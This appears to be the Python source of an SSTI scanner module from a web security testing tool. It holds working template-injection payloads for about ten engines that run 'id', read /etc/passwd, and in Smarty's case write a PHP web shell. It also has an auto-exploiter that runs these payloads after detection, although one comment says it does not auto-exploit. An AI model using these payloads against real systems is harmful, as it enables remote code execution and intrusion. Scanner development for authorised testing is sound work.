"""
websecure.scanners.ssti
------------------------
Server-Side Template Injection (SSTI) scanner.
Three-tier approach: polyglot probe -> engine fingerprinting -> PoC evidence.
Attack surfaces: URL params, POST form data, JSON body, HTTP headers, cookies.
"""
from __future__ import annotations

import logging
import random as _random
import re
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse

import requests as _requests

from websecure.scanners.base import BaseScanner
from websecure.core.payloads import load_external_payloads

_logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Tier 1: Polyglot probes — trigger math evaluation across multiple engines
# ---------------------------------------------------------------------------
_TIER1_PROBES_CORE: List[Tuple[str, str]] = [
    # Classic math evaluation — broad engine coverage
    ("{{7*7}}", r"49"),
    ("${7*7}", r"49"),
    ("#{7*7}", r"49"),
    ("<%= 7*7 %>", r"49"),
    ("*{7*7}", r"49"),
    ("{7*7}", r"49"),
    ("{{7*'7'}}", r"7777777|49"),   # Jinja2 vs Twig disambiguation
    ("${{7*7}}", r"49"),
    # Additional engine probes
    ("{{{7*7}}}", r"49"),           # Handlebars triple-stash
    ("{% 7*7 %}", r"49"),          # Django/Twig block-level
    ("{{= 7*7}}", r"49"),           # eJS-style
    ("#{ 7 * 7 }", r"49"),          # Ruby/ERB
    ("@(7*7)", r"49"),              # Razor (C#)
    ("<#assign x=7*7>${x}", r"49"), # FreeMarker alt
    # WAF bypass variants (whitespace / encoding tricks)
    ("{{7 * 7}}", r"49"),
    ("{{7\t*\t7}}", r"49"),
    ("{{\t7*7\t}}", r"49"),
    ("{{7*7 }}", r"49"),
]

def _load_ssti_tier1() -> List[Tuple[str, str]]:
    """ssti.txt'den math probe payloadlarını yükle, TIER1'e ekle."""
    seen = {p for p, _ in _TIER1_PROBES_CORE}
    extra: List[Tuple[str, str]] = []
    _MATH_KWORDS = ("7*7", "7+'7'", "7*'7'", "1+1", "3*3")
    _RCE_KWORDS  = ("popen", "subprocess", "system(", "exec(", "__import__", "Runtime", "forName")
    for line in load_external_payloads("ssti"):
        if not line or line in seen:
            continue
        seen.add(line)
        if any(k in line for k in _MATH_KWORDS):
            extra.append((line, r"49|7777777"))
        elif any(k in line for k in _RCE_KWORDS):
            # RCE kanıtı: uid= veya root: ya da hata mesajı
            extra.append((line, r"uid=\d+|root:x|java\.lang|freemarker"))
        else:
            extra.append((line, r"49|config|TemplateReference|Twig|freemarker|\d{2,}"))
    return _TIER1_PROBES_CORE + extra

_TIER1_PROBES: List[Tuple[str, str]] = _load_ssti_tier1()

# ---------------------------------------------------------------------------
# Tier 2: Engine fingerprinting probes
# ---------------------------------------------------------------------------
_TIER2_ENGINE_PROBES: Dict[str, List[Tuple[str, str]]] = {
    "Jinja2": [
        ("{{config}}", r"<Config|SECRET_KEY|DEBUG"),
        ("{{self.__class__}}", r"TemplateReference"),
        ("{{lipsum}}", r"\w+\s+\w+"),
        ("{{namespace.__init__.__globals__}}", r"builtins|__doc__"),
    ],
    "Twig": [
        ("{{_self}}", r"Twig_Template|__TwigTemplate_"),
        ("{{_self.env}}", r"Twig_Environment|__TwigEnvironment"),
        ("{{dump()}}", r"NULL|bool\(|string\("),
        ("{{constant('PHP_OS')}}", r"Linux|Windows|Darwin|FreeBSD"),
    ],
    "FreeMarker": [
        ("${.data_model}", r"freemarker|BeansWrapper"),
        ("${.template_name}", r"\.ftl|template"),
        ("${.version}", r"\d+\.\d+\.\d+"),
    ],
    "Velocity": [
        ("#set($x=7*7)${x}", r"49"),
        ("#foreach($i in [1..3])${i}#end", r"123"),
        ("#set($str=$x.class.forName('java.lang.String'))${str}", r"java\.lang\.String"),
    ],
    "Smarty": [
        ("{$smarty.version}", r"\d+\.\d+"),
        ("{php}echo 7*7;{/php}", r"49"),
        ("{math equation='7*7'}", r"49"),
    ],
    "Pebble": [
        ("{{1+1}}", r"2"),
        ("{{ 'a'.toUpperCase() }}", r"A"),
    ],
    "Mako": [
        ("${7*7}", r"49"),
        ("<% x = 7*7 %>\n${x}", r"49"),
        ("${self.uri}", r"\.html|\.mako|template"),
    ],
    "Handlebars": [
        ("{{#with 'test'}}{{this}}{{/with}}", r"test"),
        ("{{lookup . 'constructor'}}", r"function|Function"),
    ],
    "Nunjucks": [
        ("{{range.constructor}}", r"function|Function"),
        ("{{ 7 * 7 }}", r"49"),
    ],
    "Django": [
        ("{% debug %}", r"settings|DATABASES|SECRET"),
        ("{{ request.META }}", r"SERVER_NAME|HTTP_HOST"),
    ],
    "Razor": [
        ("@(7*7)", r"49"),
        ("@DateTime.Now", r"\d{4}[-/]\d{2}[-/]\d{2}"),
    ],
}

# ---------------------------------------------------------------------------
# Tier 3: PoC probes (evidence gathering only, no auto-exploit)
# ---------------------------------------------------------------------------
# Tier3 confirmation requires SPECIFIC dangerous output — not generic words like
# "object" or "class" which appear in ordinary HTML/error pages.
_TIER3_CONFIRM_RE = re.compile(
    r'(?:'
    r'uid=\d+\('              # Unix id command output
    r'|root:.*:0:0:'          # /etc/passwd content
    r'|__class__.*__mro__'    # Python MRO chain
    r'|subprocess\.Popen'     # Python subprocess reference
    r'|java\.lang\.Runtime'   # Java Runtime class
    r'|freemarker\.template'  # FreeMarker class reference
    r'|environ.*(?:PATH|HOME|USER)'  # env variable dump
    r'|_subclasses_\(\)'      # Python subclasses()
    r'|<\?xml.*encoding'      # XML/FreeMarker output
    r')',
    re.I | re.S
)

_TIER3_POC: Dict[str, List[str]] = {
    "Jinja2": [
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.environ}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{namespace.__init__.__globals__['os'].popen('id').read()}}",
    ],
    "Twig": [
        "{{_self.env.getExtension('Twig_Extension_Debug')}}",
        "{{['id']|map('system')|join}}",
        "{{'/etc/passwd'|file_excerpt(1,30)}}",
        "{{'id'|shell_exec}}",
    ],
    "FreeMarker": [
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "<#assign classloader=product.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}",
    ],
    "Mako": [
        "${self.module.cache.util.os.popen('id').read()}",
        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
    ],
    "Velocity": [
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    "Smarty": [
        "{system('id')}",
        "{php}echo shell_exec('id');{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']);?>\",self::clearConfig())}",
    ],
    "Pebble": [
        "{% set cmd = 'id' %}{% set bytes = \"\".class.forName('java.lang.Runtime').methods[6].invoke(\"\".class.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(' ')).inputStream.readAllBytes() %}{{ bytes }}",
    ],
    "Handlebars": [
        "{{#with \"s\" as |string|}}{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id').toString()\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
    ],
    "Nunjucks": [
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
    ],
    "Django": [
        "{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.object_repr}}{% endfor %}",
    ],
}


class SSTIScanner(BaseScanner):
    """
    SSTI scanner with 3-tier detection: polyglot -> fingerprint -> PoC.
    Does NOT auto-exploit. Reports Critical severity on confirmation.
    """

    name = "ssti"
    phase = "offensive"

    def __init__(self, session=None, results: Dict = None, debug: bool = False,
                 timeout: int = 10):
        super().__init__(session, results, debug)
        self.timeout = timeout
        self._seen_ssti_combos: set = set()

    # Headers to inject SSTI payloads into (common server-side reflection points)
    _INJECTION_HEADERS = [
        "User-Agent",
        "X-Forwarded-For",
        "Referer",
        "X-Custom-Header",
        "X-Api-Version",
        "Accept-Language",
        "X-Original-URL",
    ]

    def run(self, target: str, **kwargs):
        endpoints = kwargs.get("endpoints") or [target]
        forms = kwargs.get("forms") or []

        for url in endpoints:
            self._scan_url(url)
            self._scan_headers(url)
            self._scan_url_as_json(url)  # REST API surface — re-POST params as JSON

        for form in forms:
            action = form.get("action") or target
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs") or []
            self._scan_form(action, method, inputs)

        # --- Adım 5: Auto-exploit on confirmed SSTI findings -------------
        self._run_auto_exploit(endpoints)

    def _run_auto_exploit(self, endpoints: List[str]) -> None:
        """
        For each confirmed SSTI finding, run SSTIAutoExploiter to extract
        actual shell command output (id/whoami/uname) as RCE evidence.
        """
        exploiter = SSTIAutoExploiter()
        confirmed = [
            f for f in (self.results or {}).get("offensive", [])
            if f.get("vuln_type") == "SSTI" and f.get("extra", {}).get("engine", "unknown") != "unknown"
        ]
        for finding in confirmed[:5]:
            url = finding.get("url", "")
            param = finding.get("param", "")
            engine = finding.get("extra", {}).get("engine", "")
            if not (url and param and engine):
                continue
            parsed = urlparse(url)
            params = dict(parse_qsl(parsed.query))

            def inject_fn(u: str, p: str, pl: str) -> str:
                params[p] = pl
                return urlunparse(parsed._replace(query=urlencode(params)))

            result = exploiter.exploit(url, param, engine, self.session, inject_fn)
            if result:
                self.report_finding(
                    vuln_type=f"SSTI — RCE Confirmed ({engine})",
                    url=url,
                    param=param,
                    payload=result["payload"],
                    severity="Critical",
                    evidence=f"Shell output: {result['output'][:300]}",
                    extra={"engine": engine, "rce_confirmed": True, "sandbox_bypass": True},
                )

    def _scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        for param_name, _ in params:
            _combo = (url.split("?")[0], param_name)
            if _combo in self._seen_ssti_combos:
                continue
            self._seen_ssti_combos.add(_combo)

            tier1_hit = self._tier1_probe(url, parsed, params, param_name)
            if not tier1_hit:
                continue

            payload, evidence = tier1_hit
            _logger.info(f"[SSTI] Tier1 hit: {url} param={param_name}")

            engine = self._tier2_fingerprint(url, parsed, params, param_name)

            poc_evidence = None
            if engine:
                poc_evidence = self._tier3_poc(url, parsed, params, param_name, engine)

            self._emit_finding(url, param_name, payload, evidence, engine, poc_evidence)

    def _confirm_with_canary(self, url: str, parsed, params: List, param_name: str) -> bool:
        """
        Confirm SSTI with a random-canary math expression to eliminate pure reflections.
        Sends {{A*B}} and checks the response contains the unique product A*B.
        Then verifies the same product does NOT appear when sent as a plain string (reflection check).
        Returns True only if server-side evaluation is confirmed.
        """
        a = _random.randint(17, 97)
        b = _random.randint(17, 97)
        product = a * b
        # Jinja2/Twig style
        for tmpl in (f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}"):
            new_params = dict(params)
            new_params[param_name] = tmpl
            body = self._get(self._build_url(parsed, new_params))
            if body and str(product) in body:
                # Reflection check: send the literal number and see if it also appears
                baseline_params = dict(params)
                baseline_params[param_name] = str(product)
                baseline = self._get(self._build_url(parsed, baseline_params))
                if baseline and str(product) in baseline:
                    continue  # pure reflection — not a real SSTI
                return True
        return False

    def _tier1_probe(self, url: str, parsed, params: List, param_name: str
                     ) -> Optional[Tuple[str, str]]:
        """
        Parallel Tier1 probe — sends all polyglot payloads concurrently,
        then runs canary confirmation only on the first hit (serial).
        Dramatically faster on high-latency targets.
        """
        import concurrent.futures as _cf

        def _probe(item: Tuple[str, str]) -> Optional[Tuple[str, str, str]]:
            payload, expected_re = item
            new_params = dict(params)
            new_params[param_name] = payload
            test_url = self._build_url(parsed, new_params)
            body = self._get(test_url)
            if body and re.search(expected_re, body):
                return payload, expected_re, body
            return None

        hit_payload: Optional[str] = None
        hit_body: Optional[str]    = None

        with _cf.ThreadPoolExecutor(max_workers=6) as pool:
            futures = {pool.submit(_probe, item): item for item in _TIER1_PROBES}
            for fut in _cf.as_completed(futures):
                result = fut.result()
                if result:
                    # Cancel remaining futures — one hit is enough for canary check
                    for f in futures:
                        f.cancel()
                    hit_payload, _, hit_body = result
                    break

        if hit_payload is None:
            return None

        # Canary confirmation (serial) — eliminate pure parameter reflections
        if not self._confirm_with_canary(url, parsed, params, param_name):
            _logger.debug(
                f"[SSTI] Tier1 hit but canary FAILED (likely reflection): "
                f"{url} param={param_name}"
            )
            return None
        return hit_payload, (hit_body or "")[:200]

    def _tier2_fingerprint(self, url: str, parsed, params: List, param_name: str
                           ) -> Optional[str]:
        for engine, probes in _TIER2_ENGINE_PROBES.items():
            for payload, expected_re in probes:
                new_params = dict(params)
                new_params[param_name] = payload
                test_url = self._build_url(parsed, new_params)
                body = self._get(test_url)
                if body and re.search(expected_re, body, re.I):
                    _logger.info(f"[SSTI] Engine fingerprinted: {engine}")
                    return engine
        return None

    def _tier3_poc(self, url: str, parsed, params: List, param_name: str,
                   engine: str) -> Optional[str]:
        for payload in _TIER3_POC.get(engine, []):
            new_params = dict(params)
            new_params[param_name] = payload
            test_url = self._build_url(parsed, new_params)
            body = self._get(test_url)
            if body and len(body.strip()) > 10:
                # Use precise regex — avoid "object"/"class" false positives
                if _TIER3_CONFIRM_RE.search(body):
                    return body[:300]
        return None

    # ------------------------------------------------------------------
    # Surface: HTTP Headers
    # ------------------------------------------------------------------

    def _scan_headers(self, url: str):
        """Test common HTTP headers for SSTI reflection."""
        for header_name in self._INJECTION_HEADERS:
            tier1_hit = self._tier1_probe_header(url, header_name)
            if not tier1_hit:
                continue
            payload, evidence = tier1_hit
            _logger.info(f"[SSTI] Header hit: {url} header={header_name}")
            self._emit_finding(url, f"header:{header_name}", payload, evidence, None, None)

    def _confirm_header_canary(self, url: str, header_name: str) -> bool:
        """Confirm SSTI in a header via unique-canary math evaluation."""
        a = _random.randint(17, 97)
        b = _random.randint(17, 97)
        product = a * b
        for tmpl in (f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}"):
            body = self._request_with_header(url, header_name, tmpl)
            if body and str(product) in body:
                # Reflection check
                baseline = self._request_with_header(url, header_name, str(product))
                if baseline and str(product) in baseline:
                    continue
                return True
        return False

    def _tier1_probe_header(self, url: str, header_name: str) -> Optional[Tuple[str, str]]:
        for payload, expected_re in _TIER1_PROBES:
            body = self._request_with_header(url, header_name, payload)
            if body and re.search(expected_re, body):
                if not self._confirm_header_canary(url, header_name):
                    _logger.debug(f"[SSTI] Header Tier1 matched but canary failed (reflection): {url} [{header_name}]")
                    continue
                return payload, body[:200]
        return None

    def _request_with_header(self, url: str, header_name: str, payload: str) -> Optional[str]:
        try:
            headers = {header_name: payload}
            resp = self.session.get(url, headers=headers, timeout=self.timeout)
            return resp.text
        except _requests.exceptions.Timeout as exc:
            _logger.debug(f"[SSTI] Header probe timed out for {url} [{header_name}]: {exc!r}")
            return None
        except _requests.exceptions.ConnectionError as exc:
            _logger.debug(f"[SSTI] Header probe connection error for {url}: {exc!r}")
            return None
        except _requests.exceptions.RequestException as exc:
            _logger.warning(f"[SSTI] Header probe failed for {url}: {exc!r}")
            return None

    # ------------------------------------------------------------------
    # Surface: POST form data and JSON body
    # ------------------------------------------------------------------

    def _scan_form(self, action: str, method: str, inputs: List[Dict]):
        """Test each form field for SSTI via POST/GET submission."""
        skipped_types = {"submit", "button", "image", "reset", "file"}
        fuzzable = [i for i in inputs if i.get("type", "text") not in skipped_types]
        base_data = {i["name"]: i.get("value", "") for i in inputs if i.get("name")}

        for inp in fuzzable:
            p_name = inp.get("name")
            if not p_name:
                continue
            for payload, expected_re in _TIER1_PROBES:
                form_data = dict(base_data)
                form_data[p_name] = payload
                body = self._submit_form(action, method, form_data)
                if body and re.search(expected_re, body):
                    _logger.info(f"[SSTI] Form hit: {action} field={p_name}")
                    self._emit_finding(action, p_name, payload, body[:200], None, None)
                    break  # one confirmed vuln per field

        if method == "POST":
            self._scan_json_body(action, fuzzable, base_data)

    def _scan_url_as_json(self, url: str) -> None:
        """Re-POST URL query parameters as JSON body — catches REST APIs that reflect template values."""
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        if not params:
            return
        for key in list(params.keys()):
            for payload, expected_re in _TIER1_PROBES[:6]:  # top 6 polyglots only
                data = dict(params)
                data[key] = payload
                body = self._post_json(url, data)
                if body and re.search(expected_re, body):
                    _logger.info(f"[SSTI] URL-as-JSON hit: {url} key={key}")
                    self._emit_finding(url, f"json_body:{key}", payload, body[:200], None, None)
                    break

    def _scan_json_body(self, url: str, fields: List[Dict], base_data: Dict):
        """Test POST JSON body parameters for SSTI."""
        for inp in fields:
            p_name = inp.get("name")
            if not p_name:
                continue
            for payload, expected_re in _TIER1_PROBES:
                json_data = dict(base_data)
                json_data[p_name] = payload
                body = self._post_json(url, json_data)
                if body and re.search(expected_re, body):
                    _logger.info(f"[SSTI] JSON body hit: {url} field={p_name}")
                    self._emit_finding(url, f"json:{p_name}", payload, body[:200], None, None)
                    break

    def _submit_form(self, action: str, method: str, data: Dict) -> Optional[str]:
        try:
            if method == "POST":
                resp = self.session.post(action, data=data, timeout=self.timeout)
            else:
                resp = self.session.get(action, params=data, timeout=self.timeout)
            return resp.text
        except _requests.exceptions.Timeout as exc:
            _logger.debug(f"[SSTI] Form submit timed out for {action}: {exc!r}")
            return None
        except _requests.exceptions.ConnectionError as exc:
            _logger.debug(f"[SSTI] Form submit connection error for {action}: {exc!r}")
            return None
        except _requests.exceptions.RequestException as exc:
            _logger.warning(f"[SSTI] Form submit failed for {action}: {exc!r}")
            return None

    def _post_json(self, url: str, data: Dict) -> Optional[str]:
        try:
            headers = {"Content-Type": "application/json"}
            resp = self.session.post(url, json=data, headers=headers, timeout=self.timeout)
            return resp.text
        except _requests.exceptions.Timeout as exc:
            _logger.debug(f"[SSTI] JSON POST timed out for {url}: {exc!r}")
            return None
        except _requests.exceptions.ConnectionError as exc:
            _logger.debug(f"[SSTI] JSON POST connection error for {url}: {exc!r}")
            return None
        except _requests.exceptions.RequestException as exc:
            _logger.warning(f"[SSTI] JSON POST failed for {url}: {exc!r}")
            return None

    def _get(self, url: str) -> Optional[str]:
        try:
            resp = self.session.get(url, timeout=self.timeout)
            return resp.text
        except _requests.exceptions.Timeout as exc:
            _logger.debug(f"[SSTI] GET timed out for {url}: {exc!r}")
            return None
        except _requests.exceptions.ConnectionError as exc:
            _logger.debug(f"[SSTI] GET connection error for {url}: {exc!r}")
            return None
        except _requests.exceptions.RequestException as exc:
            _logger.warning(f"[SSTI] GET failed for {url}: {exc!r}")
            return None

    def _build_url(self, parsed, params: Dict) -> str:
        return urlunparse(parsed._replace(query=urlencode(params)))

    def _emit_finding(self, url: str, param: str, payload: str, evidence: str,
                      engine: Optional[str], poc: Optional[str]):
        """Emit SSTI finding via BaseScanner.report_finding() (single reporting path)."""
        extra: Dict = {
            "engine": engine or "unknown",
            "verified": True,
            "confidence": "high",
        }
        if poc:
            extra["poc_evidence"] = poc[:300]
        self.report_finding(
            vuln_type="SSTI",
            url=url,
            param=param,
            payload=payload,
            severity="Critical",
            evidence=evidence,
            extra=extra,
        )


def run(target: str, session=None, results=None, debug=False, **kwargs):
    scanner = SSTIScanner(session=session, results=results, debug=debug)
    scanner.run(target, **kwargs)


# ===========================================================================
# Adım 5 — SSTI Sandbox Bypass Payloads + Auto-Exploiter
# ===========================================================================

_SSTI_SANDBOX_BYPASS: Dict[str, List[str]] = {
    "Jinja2": [
        # __class__.__mro__ chain -> OS
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        # builtins -> __import__
        "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
        # subclasses index scan (Popen)
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        # request.environ
        "{{request.environ['PATH']}}",
    ],
    "Twig": [
        "{{['id']|map('system')|join}}",
        "{{'id'|passthru}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{'id'|shell_exec}}",
    ],
    "FreeMarker": [
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "<#assign classloader=object?api.class.protectionDomain.classLoader>"
        "<#assign bytes=classloader.loadClass('freemarker.template.utility.Execute')"
        "?new()(\"id\")>${bytes}",
    ],
    "Mako": [
        "${self.module.cache.util.os.popen('id').read()}",
        "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
        "${self.module.__loader__.exec_module.__builtins__['__import__']('os').popen('id').read()}",
    ],
    "Velocity": [
        "#set($rt=$e.class.forName('java.lang.Runtime'))"
        "#set($ex=$rt.getRuntime().exec('id'))"
        "#set($out=$ex.getInputStream())"
        "#foreach($i in [1..$out.available()])$out.read()#end",
    ],
    "Smarty": [
        "{system('id')}",
        "{php}echo shell_exec('id');{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    ],
    "Pebble": [
        "{% set cmd = 'id' %}"
        "{% set bytes = \"\".class.forName('java.lang.Runtime')"
        ".methods[6].invoke(\"\".class.forName('java.lang.Runtime')"
        ".methods[7].invoke(null),cmd.split(' ')).inputStream.readAllBytes() %}"
        "{{ bytes }}",
    ],
}

_RCE_OUTPUT_RE = re.compile(
    r"(?:uid=\d+\(|root:.*:0:0:|Linux \S+|www-data|apache|nginx"
    r"|SYSTEM|NT AUTHORITY|admin|C:\\Windows)",
    re.I | re.S,
)


class SSTIAutoExploiter:
    """
    SSTI auto-exploitation after engine fingerprinting.
    Sends sandbox bypass payloads -> extracts real shell command output.
    Single Responsibility: post-SSTI exploitation chain only.
    Open/Closed: extend _SANDBOX_BYPASS to add new engines.
    """
    _SANDBOX_BYPASS: Dict[str, List[str]] = _SSTI_SANDBOX_BYPASS
    _OUTPUT_RE = _RCE_OUTPUT_RE

    def exploit(
        self,
        url: str,
        param: str,
        engine: str,
        session: Any,
        inject_fn: Callable[[str, str, str], str],
        timeout: int = 10,
    ) -> Optional[Dict[str, Any]]:
        """
        Try sandbox bypass payloads for the given engine.
        Returns dict with payload + extracted output on success, None otherwise.
        """
        payloads = self._SANDBOX_BYPASS.get(engine, [])
        for payload in payloads:
            try:
                injected = inject_fn(url, param, payload)
                resp = session.get(injected, timeout=timeout)
                text = resp.text or ""
                m = self._OUTPUT_RE.search(text)
                if m:
                    start = max(0, m.start() - 20)
                    end = min(len(text), m.end() + 200)
                    return {
                        "engine": engine,
                        "payload": payload,
                        "output": text[start:end].strip(),
                        "rce_confirmed": True,
                    }
            except Exception:
                continue
        return None
